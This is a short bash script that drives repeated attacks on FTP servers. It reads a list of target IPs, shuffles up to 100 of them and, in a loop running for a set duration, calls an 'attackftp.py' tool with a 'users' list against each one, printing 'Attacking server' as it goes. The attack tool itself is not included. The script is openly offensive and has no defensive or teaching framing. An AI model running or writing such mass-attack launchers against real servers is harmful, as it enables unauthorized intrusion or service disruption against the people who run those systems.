#!/bin/bash

#give the duration of the attack per bot
#duration=${1:-"9999999999"}

duration=${2:-60}

echo "running $duration"



server=${1:-$attack_servers}

rm tem.file 2>/dev/null

for item in $server;do
	echo $item >> tem.file
	echo  >> tem.file
done


server=$(shuf -n 100 tem.file)
count=0
while  ! [ true -a  $count -gt $duration ];do 
	
	for ip in $server;do
		python attackftp.py -t $ip -p users
		sleep 1
		echo " "
		echo "Attacking server $ip"
		echo "$count NTH TIME"
		echo "################################"
	    echo " "
	done
	count=$(($count + 1))
done



